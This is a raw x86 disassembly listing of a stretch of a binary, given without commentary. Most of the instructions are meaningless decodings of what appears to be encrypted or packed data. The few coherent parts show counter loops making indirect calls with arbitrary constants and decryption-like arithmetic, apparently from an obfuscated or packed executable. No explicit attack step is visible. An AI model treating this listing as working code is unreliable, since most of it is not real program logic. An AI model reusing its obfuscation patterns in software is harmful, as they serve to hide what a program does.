  4051cc:	jle    0x40522e
  4051ce:	sbb    BYTE PTR [eax],al
  4051d0:	push   esp
  4051d1:	push   cs
  4051d2:	and    edx,DWORD PTR [edi-0x544a8fa8]
  4051d8:	and    eax,0x7d122ec1
  4051dd:	cmovno edx,DWORD PTR [eax-0x7ae92d0f]
  4051e4:	(bad)  
  4051e5:	dec    edx
  4051e6:	mov    al,ds:0xcd651c68
  4051eb:	leave  
  4051ec:	sbb    BYTE PTR [edx],al
  4051ee:	outs   dx,BYTE PTR ds:[esi]
  4051ef:	and    edx,DWORD PTR [edi]
  4051f1:	mov    al,ds:0x8d231e16
  4051f6:	pusha  
  4051f7:	push   0x4fe2e368
  4051fc:	mov    ?,WORD PTR [ebx+ebx*2-0x641100d1]
  405203:	adc    eax,0xa35c7579
  405208:	sti    
  405209:	xchg   ebp,eax
  40520a:	jne    0x4051c1
  40520c:	pop    ecx
  40520d:	std    
  40520e:	loope  0x40521c
  405210:	nop
  405211:	xchg   edx,eax
  405212:	add    bh,al
  405214:	std    
  405215:	add    eax,0xcfa60db5
  40521a:	imul   ecx,ebp,0x18
  40521d:	add    al,BYTE PTR [edi-0x17c6b3ec]
  405223:	jp     0x40524d
  405225:	add    BYTE PTR [eax+0x4f],bh
  405228:	sahf   
  405229:	push   esp
  40522a:	push   ecx
  40522b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40522c:	imul   edi,DWORD PTR [ebp+esi*8+0x60],0x6a2d395c
  405234:	out    0x3c,al
  405236:	cmp    eax,0x137aaba4
  40523b:	mov    bh,al
  40523d:	mov    ah,BYTE PTR [esi+0x7f26b70]
  405243:	jnp    0x405216
  405245:	cmp    DWORD PTR [ebx],0x81e54709
  40524b:	mov    bh,0x31
  40524d:	lock fild QWORD PTR [ebx]
  405250:	xor    al,0xd2
  405252:	leave  
  405253:	dec    esi
  405254:	mov    ebx,0x48c62783
  405259:	push   0x3c
  40525b:	cmp    BYTE PTR [esi+0x5afae389],0x53
  405262:	outs   dx,DWORD PTR ds:[esi]
  405263:	dec    ebp
  405264:	mov    ebp,0xdde4fe24
  405269:	cmc    
  40526a:	pusha  
  40526b:	jle    0x4052e8
  40526d:	repz call 0xada8873d
  405273:	mov    DWORD PTR [esi-0x19],edx
  405276:	mov    edi,0xc1827021
  40527b:	icebp  
  40527c:	sub    BYTE PTR [ebp-0x28],al
  40527f:	inc    esp
  405280:	mov    ch,0xe4
  405282:	mov    BYTE PTR [ebp+0x661e355f],bl
  405288:	out    dx,eax
  405289:	and    eax,0x9ca5c8a8
  40528e:	xchg   esi,eax
  40528f:	sub    eax,DWORD PTR cs:0xf486a62
  405296:	div    BYTE PTR [eax]
  405298:	in     al,0xb7
  40529a:	icebp  
  40529b:	pop    esi
  40529c:	ins    BYTE PTR es:[edi],dx
  40529d:	out    0x96,al
  40529f:	xor    eax,0xad11a77
  4052a4:	mov    ch,0x37
  4052a6:	imul   edx,edi
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x430626,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x430626
  4052ff:	inc    eax
  405300:	mov    ds:0x430626,eax
  405305:	cmp    DWORD PTR ds:0x430626,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x430626,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42ec28
  40533f:	cmp    DWORD PTR ds:0x430626,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x430626
  405351:	inc    eax
  405352:	mov    ds:0x430626,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x43065a
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x4306ea
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x430642
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x430632,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x430626
  40538a:	add    DWORD PTR ds:0x42e8f2,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x43063e,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x43063e
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x43063e,ecx
  4053ae:	cmp    DWORD PTR ds:0x43063e,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42ed20
  4053c9:	cmp    DWORD PTR ds:0x43063e,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ef94,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ef94
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ef94,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ef94,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42eb64
  405405:	cmp    DWORD PTR ds:0x42ef94,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ef94
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ef94,ecx
  40541f:	cmp    DWORD PTR ds:0x42ef94,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x1a5d6109
  405456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405457:	shl    BYTE PTR [esi+edi*2],cl
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x405489
  405460:	dec    esi
  405461:	stos   DWORD PTR es:[edi],eax
  405462:	pushf  
  405463:	stos   DWORD PTR es:[edi],eax
  405464:	mov    esp,DWORD PTR [edx-0x2f3ff960]
  40546a:	mov    cl,BYTE PTR [ebx]
  40546c:	sub    BYTE PTR [eax+ebp*8+0xa],dl
  405470:	loope  0x405445
  405472:	aam    0xa2
  405474:	cwde   
  405475:	jp     0x40541c
  405477:	or     ebx,DWORD PTR [ebx+0x2af3b93b]
  40547d:	xchg   edx,eax
  40547e:	mov    dl,0xa1
  405480:	mov    ch,0xa6
  405482:	and    BYTE PTR [edx+ebx*8-0x77fb1a19],cl
  405489:	dec    eax
  40548a:	push   eax
  40548b:	sbb    ecx,esi
  40548d:	or     DWORD PTR [esi+esi*4+0x6d957c81],eax
  405494:	adc    eax,0xe4f1fef9
  405499:	cmc    
  40549a:	jge    0x405428
  40549c:	xor    eax,0x8ea8b08a
  4054a1:	sub    ecx,DWORD PTR [ecx+0x7c]
  4054a4:	stos   BYTE PTR es:[edi],al
  4054a5:	xchg   edi,eax
  4054a6:	mov    al,ds:0xe38fa5db
  4054ab:	or     al,0x32
  4054ad:	call   0xd07cd66d
  4054b2:	rol    eax,1
  4054b4:	in     al,dx
  4054b5:	fwait
  4054b6:	clc    
  4054b7:	pop    ss
  4054b8:	pop    esp
  4054b9:	add    ah,BYTE PTR [edi+0x21]
  4054bc:	dec    ebx
  4054bd:	imul   ebp,DWORD PTR [edx+0x26cec40c],0xffffffda
  4054c4:	data16 jle 0x40551d
  4054c7:	jbe    0x4054ee
  4054c9:	stc    
  4054ca:	shl    dl,cl
  4054cc:	mov    bl,0x3e
  4054ce:	xchg   ebp,eax
  4054cf:	ret    
  4054d0:	loop   0x405458
  4054d2:	mov    esp,0x4128f5ba
  4054d7:	jno    0x40550a
  4054d9:	(bad)  
  4054da:	(bad)  
  4054db:	out    dx,eax
  4054dc:	sbb    al,0x86
  4054de:	nop
  4054df:	js     0x4054e7
  4054e1:	test   al,0x31
  4054e3:	scas   al,BYTE PTR es:[edi]
  4054e4:	mov    dh,BYTE PTR [edi-0x2dde6553]
  4054ea:	in     al,dx
  4054eb:	(bad)  
  4054ec:	sub    eax,0xdb171a8c
  4054f1:	lahf   
  4054f2:	mov    bh,0x8c
  4054f4:	int    0xfa
  4054f6:	in     eax,dx
  4054f7:	inc    edx
  4054f8:	xlat   BYTE PTR ds:[ebx]
  4054f9:	sub    DWORD PTR [ebp+0x6f78fa61],ecx
  4054ff:	test   BYTE PTR [ebx-0x8],cl
  405502:	mov    DWORD PTR [eax-0x7c43105e],ebp
  405508:	inc    ebx
  405509:	sbb    cl,bh
  40550b:	(bad)  
  40550c:	pop    esi
  40550d:	mov    ch,0x97
  40550f:	lods   eax,DWORD PTR ds:[esi]
  405510:	push   ebp
  405511:	pop    ss
  405512:	mov    dh,BYTE PTR [ecx+0x48]
  405515:	out    dx,al
  405516:	xchg   edx,eax
  405517:	ins    DWORD PTR es:[edi],dx
  405518:	push   ds
  405519:	inc    ecx
  40551a:	sbb    bl,BYTE PTR [eax]
  40551c:	jmp    DWORD PTR [edx-0x3]
  40551f:	mov    DWORD PTR [ecx+0x5b],eax
  405522:	xchg   edi,eax
  405523:	pop    ebp
  405524:	es in  al,0x50
  405527:	ffree  st(5)
  405529:	or     eax,0x40a2c275
  40552e:	cmp    DWORD PTR [edx+0x60],esi
  405531:	outs   dx,BYTE PTR ds:[esi]
  405532:	mov    al,0x94
  405534:	jno    0x4055a6
  405536:	out    0xd1,eax
  405538:	and    edi,eax
  40553a:	ins    DWORD PTR es:[edi],dx
  40553b:	ins    DWORD PTR es:[edi],dx
  40553c:	(bad)  
  40553d:	shl    DWORD PTR [edx+0x53e7b79c],1
  405543:	adc    al,0xfa
  405545:	mov    cl,0xc9
  405547:	sti    
  405548:	and    DWORD PTR [edi],edi
  40554a:	push   esp
  40554b:	inc    BYTE PTR [edi]
  40554d:	dec    ebp
  40554e:	xchg   BYTE PTR [edi],ah
  405550:	mov    ds:0x4de5afda,al
  405555:	or     eax,0xfa3e54eb
  40555a:	and    DWORD PTR [ebx],0xffffffab
  40555d:	inc    eax
  40555e:	dec    esp
  40555f:	mov    bh,0xbd
  405561:	lods   eax,DWORD PTR ds:[esi]
  405562:	je     0x405502
  405564:	aad    0x5a
  405566:	adc    ebp,DWORD PTR [edx+0x66]
  405569:	add    BYTE PTR [eax+0x1e],bh
  40556c:	lods   eax,DWORD PTR ds:[esi]
  40556d:	test   BYTE PTR [ebp-0x79],bl
  405570:	pop    ss
  405571:	adc    dl,al
  405573:	xchg   ebp,eax
  405574:	cli    
  405575:	dec    edx
  405576:	or     BYTE PTR [ebp+ebp*8-0x4fa6d539],dl
  40557d:	fisttp DWORD PTR [eax-0x691ff865]
  405583:	mov    bh,0x40
  405585:	mov    ecx,edx
  405587:	hlt    
  405588:	jp     0x405609
  40558a:	dec    esi
  40558b:	in     al,0x41
  40558d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40558e:	xchg   ebx,eax
  40558f:	(bad)  
  405590:	cmp    eax,0xeb8f66c
  405595:	mov    ebp,0xa693c14f
  40559a:	fidivr DWORD PTR [eax-0x688a26fd]
  4055a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a1:	int    0x8d
  4055a3:	fcomp  DWORD PTR [ebx+0x50]
  4055a6:	aam    0x4
  4055a8:	pop    ds
  4055a9:	icebp  
  4055aa:	into   
  4055ab:	push   edx
  4055ac:	test   DWORD PTR [edi-0x66],ebp
  4055af:	aas    
  4055b0:	push   ebp
  4055b1:	neg    BYTE PTR [ecx+0x1b37a7c0]
  4055b7:	ins    BYTE PTR es:[edi],dx
  4055b8:	lods   al,BYTE PTR ds:[esi]
  4055b9:	mov    cl,0x84
  4055bb:	mov    dl,0xca
  4055bd:	jp     0x4055ed
  4055bf:	and    dl,BYTE PTR [ecx+0x5ac77cd]
  4055c5:	and    eax,0x19eb0312
  4055ca:	add    edi,DWORD PTR [ebp+0x10]
  4055cd:	mov    ch,0xf9
  4055cf:	aad    0x28
  4055d1:	daa    
  4055d2:	pushf  
  4055d3:	shr    ebx,0xd9
  4055d6:	pop    edi
  4055d7:	dec    esp
  4055d8:	fsubr  QWORD PTR [ebx-0x4f]
  4055db:	jnp    0x40561f
  4055dd:	pop    ss
  4055de:	pop    es
  4055df:	ins    BYTE PTR es:[edi],dx
  4055e0:	(bad)  
  4055e1:	mov    ds:0x99ce787a,al
  4055e6:	arpl   WORD PTR [ebp+0x442e567],dx
  4055ec:	jge    0x40561b
  4055ee:	adc    DWORD PTR [edi-0xbe6c060],ebx
  4055f4:	stc    
  4055f5:	out    0x5b,al
  4055f7:	into   
  4055f8:	faddp  st(3),st
  4055fa:	xor    ch,BYTE PTR [ecx-0x61b75528]
  405600:	and    cl,BYTE PTR [ebx]
  405602:	idiv   DWORD PTR [eax+0x5e]
  405605:	jg     0x405660
  405607:	xchg   edx,eax
  405608:	lods   al,BYTE PTR ds:[esi]
  405609:	mov    WORD PTR [ebx+eiz*8-0x220c21a0],ds
  405610:	adc    al,0xcb
  405612:	sti    
  405613:	push   ecx
  405614:	out    0x68,al
  405616:	sub    al,0x10
  405618:	sbb    eax,0xe8604df7
  40561d:	call   DWORD PTR [esi]
  40561f:	sub    al,0x67
  405621:	sub    al,0x43
  405623:	sbb    DWORD PTR [ebx],esi
  405625:	icebp  
  405626:	pop    ds
  405627:	jmp    0x405633
  405629:	mov    ebp,0x3d80deb1
  40562e:	sbb    eax,0x4e643ea1
  405633:	pop    eax
  405634:	dec    eax
  405635:	sbb    al,0x2c
  405637:	xor    eax,0x6b292e2b
  40563c:	retf   0x912c
  40563f:	popf   
  405640:	dec    edx
  405641:	jbe    0x4056b4
  405643:	push   ds
  405644:	xchg   esi,eax
  405645:	inc    edi
  405646:	call   0x6588:0x38412652
  40564d:	lods   al,BYTE PTR ds:[esi]
  40564e:	xor    ebp,DWORD PTR [esi-0x3808a87b]
  405654:	scas   al,BYTE PTR es:[edi]
  405655:	fs (bad) 
  405657:	ror    bl,1
  405659:	outs   dx,BYTE PTR ds:[esi]
  40565a:	scas   al,BYTE PTR es:[edi]
  40565b:	fidiv  WORD PTR [esi+esi*4-0x488a4d3b]
  405662:	in     al,dx
  405663:	retf   
  405664:	das    
  405665:	inc    eax
  405666:	js     0x405652
  405668:	mov    dl,0x13
  40566a:	in     al,0xd0
  40566c:	mov    DWORD PTR ds:0x13be349,0x4d853c33
  405676:	ds test eax,0x8e75ed84
  40567c:	push   ss
  40567d:	jo     0x4056a0
  40567f:	jg     0x405611
  405681:	push   edi
  405682:	in     eax,dx
  405683:	jb     0x405631
  405685:	sub    cl,dh
  405687:	inc    eax
  405688:	outs   dx,BYTE PTR ds:[esi]
  405689:	mov    DWORD PTR [edi],ebp
  40568b:	out    dx,al
  40568c:	rol    DWORD PTR [edx+0x19],1
  40568f:	adc    BYTE PTR [edx],bh
  405691:	cmp    al,ah
  405693:	aas    
  405694:	xor    cl,BYTE PTR ds:0x540696dc
  40569a:	pop    ds
  40569b:	das    
  40569c:	xor    edi,ebx
  40569e:	inc    ebx
  40569f:	(bad)  
  4056a0:	out    0x2d,eax
  4056a2:	jl     0x405625
  4056a4:	jmp    FWORD PTR [esi-0x3b]
  4056a7:	mov    ds:0xa9ec3216,al
  4056ac:	push   edi
  4056ad:	cmc    
  4056ae:	and    DWORD PTR [ecx],ebp
  4056b0:	mov    WORD PTR [edx-0x7a],ds
  4056b3:	test   bh,al
  4056b5:	lods   al,BYTE PTR ds:[esi]
  4056b6:	xor    DWORD PTR [edx+0x56ee7fb],0x2d
  4056bd:	je     0x65ae499
  4056c3:	adc    al,0xb5
  4056c5:	jae    0x4056ac
  4056c7:	(bad)  
  4056c8:	outs   dx,BYTE PTR ds:[esi]
  4056c9:	lea    esi,[esi-0x7df8d375]
  4056cf:	inc    esi
  4056d0:	lods   eax,DWORD PTR ds:[esi]
  4056d1:	dec    ebp
  4056d2:	pop    ecx
  4056d3:	js     0x4056bc
  4056d5:	test   al,0xa8
  4056d7:	dec    ebx
  4056d8:	jo     0x405689
  4056da:	arpl   ax,bp
  4056dc:	aas    
  4056dd:	add    edx,0x73c0ae29
  4056e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056e4:	xor    edx,DWORD PTR [edi+0x77]
  4056e7:	jns    0x405767
  4056e9:	sbb    ebx,edi
  4056eb:	dec    ebp
  4056ec:	push   ds
  4056ed:	mov    eax,ds:0x76b7235d
  4056f2:	jbe    0x40574c
  4056f4:	pop    ebp
  4056f5:	fadd   DWORD PTR [eax]
  4056f7:	ror    dh,0x2
  4056fa:	hlt    
  4056fb:	or     edi,DWORD PTR [ebp+0x1c17a744]
  405701:	sub    al,0x17
  405703:	push   cs
  405704:	imul   DWORD PTR [edx]
  405706:	dec    edi
  405707:	sbb    BYTE PTR [esi-0x6d],bh
  40570a:	sub    al,dl
  40570c:	iret   
  40570d:	mul    DWORD PTR [ecx]
  40570f:	jae    0x4056c6
  405711:	jl     0x405792
  405713:	jae    0x405733
  405715:	dec    ebp
  405716:	xor    DWORD PTR ds:0x590f92e6,0x12
  40571d:	(bad)  cs:[edi]
  405720:	mov    bl,0x6c
  405722:	add    esp,DWORD PTR [ecx]
  405724:	fnstsw WORD PTR ds:0xb510f77b
  40572a:	mov    ebp,0x2a4dedde
  40572f:	je     0x40574c
  405731:	cwde   
  405732:	mov    esp,0x90c52422
  405737:	mov    ebx,0x3cc57728
  40573c:	inc    edi
  40573d:	or     al,0xd8
  40573f:	fbld   TBYTE PTR [edx+0x59ae319a]
  405745:	xor    ch,BYTE PTR [ecx+ebp*8-0x2f39d89f]
  40574c:	pop    es
  40574d:	xor    ah,BYTE PTR [ecx+0x1a]
  405750:	jne    0x405723
  405752:	stos   BYTE PTR es:[edi],al
  405753:	popa   
  405754:	or     al,BYTE PTR [edx]
  405756:	inc    ebx
  405757:	sub    BYTE PTR [eax+eiz*8],al
  40575a:	inc    ebx
  40575b:	dec    ecx
  40575c:	in     al,0x1b
  40575e:	jmp    0x4056e9
  405760:	mov    eax,0x56af606
  405765:	mov    WORD PTR [eax-0x2d],ss
  405768:	adc    al,0x56
  40576a:	sbb    eax,0x713b3936
  40576f:	jns    0x4057b5
  405771:	ja     0x405780
  405773:	outs   dx,BYTE PTR ds:[esi]
  405774:	ja     0x40577d
  405776:	xor    DWORD PTR [edi-0x733d1700],edx
  40577c:	stos   DWORD PTR es:[edi],eax
  40577d:	push   ebp
  40577e:	mov    eax,ds:0x593f2f77
  405783:	inc    ecx
  405784:	dec    edi
  405785:	push   0x2b
  405787:	ffreep st(6)
  405789:	sub    DWORD PTR [ecx+eax*2],eax
  40578c:	int3   
  40578d:	imul   ebx,esi,0x1e363bcf
  405793:	sahf   
  405794:	shl    DWORD PTR [esi],0x1b
  405797:	add    DWORD PTR [edi-0x51],ecx
  40579a:	not    DWORD PTR [ecx+0x246765e2]
  4057a0:	sub    DWORD PTR ds:[edi+0x4a],eax
  4057a4:	sbb    ecx,DWORD PTR [eax]
  4057a6:	xor    BYTE PTR [edi+0x7a9b4706],dl
  4057ac:	push   ebp
  4057ad:	adc    al,0x59
  4057af:	test   BYTE PTR [eax-0x2851aa93],ah
  4057b5:	sbb    eax,0x9a76e145
  4057ba:	cwde   
  4057bb:	jp     0x4057c4
  4057bd:	dec    esi
  4057be:	cmp    edx,DWORD PTR [edx-0x1d]
  4057c1:	mov    edx,0xb6eb13dd
  4057c6:	cdq    
  4057c7:	sub    ebp,ebx
  4057c9:	lods   eax,DWORD PTR ds:[esi]
  4057ca:	push   ebx
  4057cb:	ret    0x8b10
  4057ce:	xor    al,0x5a
  4057d0:	dec    edi
  4057d1:	js     0x405796
  4057d3:	ja     0x40575a
  4057d5:	retf   
  4057d6:	out    0x85,al
  4057d8:	sub    ecx,DWORD PTR [esi]
  4057da:	es out dx,eax
  4057dc:	fcmovnb st,st(1)
  4057de:	aad    0x3b
  4057e0:	sbb    DWORD PTR [edi],edi
  4057e2:	repz hlt 
  4057e4:	mov    cl,0xff
  4057e6:	(bad)  
  4057e7:	pop    ebx
  4057e8:	mov    al,0x89
  4057ea:	cmp    al,cl
  4057ec:	fsubr  QWORD PTR [esi-0xf]
  4057ef:	dec    eax
  4057f0:	sub    edi,edx
  4057f2:	adc    eax,0x47fa4d34
  4057f7:	sub    al,ah
  4057f9:	cmp    BYTE PTR [edi],bl
  4057fb:	cwde   
  4057fc:	int3   
  4057fd:	inc    edi
  4057fe:	dec    ebp
  4057ff:	fist   WORD PTR [ebx]
  405801:	jecxz  0x40581a
  405803:	call   FWORD PTR [ebx]
  405805:	pop    es
  405806:	mov    esi,0x2142fab5
  40580b:	adc    eax,DWORD PTR [edx+eax*2-0x7b]
  40580f:	xor    dl,BYTE PTR [edi]
  405811:	icebp  
  405812:	lock lods al,BYTE PTR ds:[esi]
  405814:	inc    ebx
  405815:	add    al,ch
  405817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405818:	mov    cl,0x91
  40581a:	fst    st(0)
  40581c:	pavgw  mm7,QWORD PTR [ebx]
  40581f:	cli    
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8+0x49be723c],bh
  405847:	pop    ds
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0x87e7e71
  405851:	scas   eax,DWORD PTR es:[edi]
  405852:	outs   dx,DWORD PTR ds:[esi]
  405853:	sbb    DWORD PTR [edx+eax*1+0x6b],ebp
  405857:	mov    ebx,0x87af1787
  40585c:	out    dx,eax
  40585d:	inc    esp
  40585e:	dec    ecx
  40585f:	and    esp,DWORD PTR [edx]
  405861:	jae    0x405864
  405863:	shl    DWORD PTR [edi-0x73],0x96
  405867:	mov    eax,ds:0x2ea9536f
  40586c:	stos   BYTE PTR es:[edi],al
  40586d:	pusha  
  40586e:	shl    BYTE PTR [eax],1
  405870:	and    al,0xf1
  405872:	mov    WORD PTR [edx-0x558021f0],es
  405878:	in     eax,0x42
  40587a:	and    ebp,eax
  40587c:	retf   0x91d5
  40587f:	enter  0x3935,0x19
  405883:	push   ecx
  405884:	or     DWORD PTR [ecx+0x1e],ebp
  405887:	repz and al,0x4d
  40588a:	repz xlat BYTE PTR ds:[ebx]
  40588c:	or     ah,BYTE PTR [edx-0x69b73db7]
  405892:	iret   
  405893:	shufps xmm1,xmm7,0x8
  405897:	stos   DWORD PTR es:[edi],eax
  405898:	out    dx,al
  405899:	into   
  40589a:	cmp    ebp,DWORD PTR [ecx]
  40589c:	(bad)  
  40589d:	xor    ecx,DWORD PTR [ecx]
  40589f:	or     eax,0xdb2ffeb6
  4058a4:	push   0x48
  4058a6:	cwde   
  4058a7:	fldcw  WORD PTR [ecx+ecx*8+0x13c96c78]
  4058ae:	int    0xd4
  4058b0:	cmp    BYTE PTR [edi],ch
  4058b2:	vpackssdw ymm5,ymm3,ymm5
  4058b6:	inc    ebp
  4058b7:	enter  0x3aaf,0x9a
  4058bb:	mov    bl,0x6e
  4058bd:	icebp  
  4058be:	cld    
  4058bf:	jle    0x4058bd
  4058c1:	in     eax,dx
  4058c2:	and    ebx,0x4074b6d3
  4058c8:	xchg   edx,eax
  4058c9:	test   DWORD PTR [eax],esp
  4058cb:	dec    ebx
  4058cc:	cmc    
  4058cd:	cmc    
  4058ce:	and    eax,0x17b1a9ce
  4058d3:	cmp    edi,DWORD PTR ds:0x55da19a5
  4058d9:	pushf  
  4058da:	ds mov edi,0x20e17a23
  4058e0:	cmp    al,0x82
  4058e2:	xor    esi,ebx
  4058e4:	sbb    esp,esp
  4058e6:	loope  0x4058c2
  4058e8:	mov    ebx,0xd2861bf4
  4058ed:	sbb    eax,0xe9707869
  4058f2:	xchg   edx,eax
  4058f3:	clc    
  4058f4:	add    BYTE PTR [ebx-0x16b3c2e0],dl
  4058fa:	in     al,dx
  4058fb:	(bad)  
  4058fc:	fcmovne st,st(4)
  4058fe:	rcl    BYTE PTR [ecx+0x2fe6b88f],1
  405904:	sar    DWORD PTR [ebx+edx*1+0x75f52a99],cl
  40590b:	jmp    0x405917
  40590d:	ss out 0xae,eax
  405910:	loop   0x4058f3
  405912:	and    DWORD PTR [ebx],edi
  405914:	std    
  405915:	scas   eax,DWORD PTR es:[edi]
  405916:	jmp    0x86ab:0xddd4f637
  40591d:	ja     0x4058d1
  40591f:	cmp    ebp,DWORD PTR [eax+0x69ed27be]
  405925:	(bad)  
  405926:	push   ss
  405927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405928:	jmp    0x1d96b142
  40592d:	imul   eax,DWORD PTR [ebx],0x3c
  405930:	pop    ds
  405931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405932:	repnz fs mov esp,0xc1d4a7d3
  405939:	jg     0x40592d
  40593b:	lods   al,BYTE PTR ds:[esi]
  40593c:	in     eax,dx
  40593d:	cmp    eax,DWORD PTR [eax]
  40593f:	mul    DWORD PTR [edx+ecx*4]
  405942:	and    DWORD PTR [edi],eax
  405944:	(bad)  [esi-0x76]
  405947:	stc    
  405948:	dec    esp
  405949:	shr    DWORD PTR [edx+0xa],cl
  40594c:	cli    
  40594d:	or     ebp,DWORD PTR [ebx-0x3d2f6976]
  405953:	mov    bl,0xe4
  405955:	dec    edi
  405956:	mov    eax,0xb5e2952c
  40595b:	dec    ebx
  40595c:	mov    BYTE PTR [ebx],al
  40595e:	inc    ebx
  40595f:	pop    esp
  405960:	pop    eax
  405961:	pop    ebx
  405962:	lsl    ebx,di
  405965:	idiv   DWORD PTR [ebx+0x19]
  405968:	repz retf 
  40596a:	dec    ecx
  40596b:	adc    eax,0x990bb98e
  405970:	push   edx
  405971:	jbe    0x405958
  405973:	push   esi
  405974:	ss push ebx
  405976:	(bad)  [esi+0x55]
  405979:	rcl    DWORD PTR [ebp-0x39],0x55
  40597d:	call   0x5abc:0x225c9e16
  405984:	popa   
  405985:	cld    
  405986:	sbb    al,0xeb
  405988:	call   0x93ed76c
  40598d:	mov    ch,0x7e
  40598f:	ins    BYTE PTR es:[edi],dx
  405990:	add    ebx,ebp
  405992:	or     eax,0x8e3544fc
  405997:	fdivr  DWORD PTR [edx]
  40599a:	call   0xa045:0x2a731863
  4059a1:	dec    edi
  4059a2:	lahf   
  4059a3:	push   edx
  4059a4:	call   FWORD PTR [edi]
  4059a6:	xchg   ebp,esi
  4059a8:	fbld   TBYTE PTR [edx-0x3e74b567]
  4059ae:	stos   BYTE PTR es:[edi],al
  4059af:	push   eax
  4059b0:	jmp    0xcde8d979
  4059b5:	jo     0x405a17
  4059b7:	push   ss
  4059b8:	xor    DWORD PTR [ecx],edx
  4059ba:	mov    dh,0xcf
  4059bc:	mov    al,0x44
  4059be:	scas   al,BYTE PTR es:[edi]
  4059bf:	scas   al,BYTE PTR es:[edi]
  4059c0:	dec    edi
  4059c1:	das    
  4059c2:	add    eax,0xcf4f4006
  4059c7:	and    edx,DWORD PTR [edx+eiz*8]
  4059ca:	(bad)  
  4059cb:	push   esi
  4059cc:	pop    esp
  4059cd:	mov    bl,0xf6
  4059cf:	jmp    0x4059ff
  4059d1:	pusha  
  4059d2:	sub    al,0x27
  4059d4:	retf   
  4059d5:	cmp    bh,BYTE PTR [edx]
  4059d7:	js     0x4059df
  4059d9:	clc    
  4059da:	add    esp,esi
  4059dc:	xchg   ebx,eax
  4059dd:	mov    BYTE PTR [edx-0x34722b23],ch
  4059e3:	sbb    eax,0xc874180e
  4059e8:	pop    ss
  4059e9:	call   0xd9f2bb30
  4059ee:	xchg   edi,eax
  4059ef:	mov    dh,0x74
  4059f1:	and    eax,0x8189dec9
  4059f6:	daa    
  4059f7:	test   BYTE PTR [esi-0x758309f6],cl
  4059fd:	popa   
  4059fe:	jae    0x405a56
  405a00:	leave  
  405a01:	loop   0x4059ac
  405a03:	push   cs
